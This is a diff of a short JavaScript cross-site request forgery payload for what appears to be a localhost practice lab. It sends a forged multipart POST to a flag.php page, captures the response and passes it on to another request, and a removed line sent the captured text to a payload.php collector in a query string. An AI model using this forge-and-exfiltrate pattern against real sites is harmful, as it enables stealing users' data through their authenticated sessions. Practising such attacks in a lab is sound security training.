@@ -1,13 +1,13 @@
 var xhr = new XMLHttpRequest();
 // var text="";
 data='------WebKitFormBoundarypnNoh0sxdPb4ernp\r\nContent-Disposition: form-data; name="file"; filename="x.txt" \r\nContent-Type: text/plain\r\n\r\n\r\n------WebKitFormBoundarypnNoh0sxdPb4ernp--\r\n'
-xhr.open("POST","http://localhost/csrf/practice1/flag.php");
-xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryrYYLq4HkfCAAYZXe");
-xhr.withCredentials = true;
+xhr.open("POST","http://localhost/csrf/practice2/flag.php");
+xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarypnNoh0sxdPb4ernp");
 xhr.onreadystatechange = CallbackFun;
 xhr.send(data);
 function CallbackFun(){
-    if (xhr.readyState==4 && xhr.status==200){
+    if (xhr.readyState==4 && xhr.status
+==200){
         window.text = xhr.responseText;
         // alert(text);
 
@@ -21,4 +21,3 @@ function submit(text){
     xhr2.send();
 }
 
-// window.location.href="http://localhost/csrf/practice1/payload.php?c="+text;
